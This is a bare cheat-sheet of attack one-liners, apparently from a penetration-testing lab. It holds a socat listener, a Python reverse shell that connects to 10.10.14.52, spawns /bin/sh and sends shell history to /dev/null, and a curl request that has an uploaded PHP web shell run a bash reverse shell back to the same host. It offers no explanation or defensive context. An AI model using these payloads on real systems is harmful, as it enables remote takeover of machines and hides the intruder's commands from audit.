##############################################################  
socat file:`tty`,echo=0,raw udp-listen:1234  
import subprocess; subprocess.Popen(["python", "-c", 'import os;import pty;import socket;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.connect((\"10.10.14.52\", 1230));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv(\"HISTFILE\",\"/dev/null\");pty.spawn(\"/bin/sh\");s.close()'])  
  
curl -G http://10.10.10.24/uploads/akaed.php --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.52/443 0>&1'"  
##############################################################